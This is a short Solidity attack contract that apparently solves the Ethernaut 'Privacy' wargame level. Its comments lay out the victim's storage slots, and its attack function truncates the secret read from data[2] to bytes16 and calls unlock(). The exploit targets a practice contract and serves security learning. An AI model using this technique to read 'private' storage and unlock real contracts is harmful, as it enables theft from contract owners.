// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPrivacy{
    function unlock(bytes16) external;
}

contract PrivacyAttack {
//   bool public locked = true;                            --- Storage Slot 0
//   uint256 public ID = block.timestamp;                  --- Storage Slot 1
//   uint8 private flattening = 10;                        --- Storage Slot 2
//   uint8 private denomination = 255;                     --- Storage Slot 2
//   uint16 private awkwardness = uint16(block.timestamp); --- Storage Slot 2
//   bytes32[3] private data;                              --- Storage Slot 3 - 4 - 5
    
    IPrivacy public ethernautInstance;

    constructor (address instanceAddress) {
        ethernautInstance = IPrivacy(instanceAddress);
    }

    // data[2] is 32 bytes long. 
    // Mimic the victim contract. Get bytes32 variable as input and call the instance as bytes16.
    function attack(bytes32 key) public {
        ethernautInstance.unlock(bytes16(key));
    }

}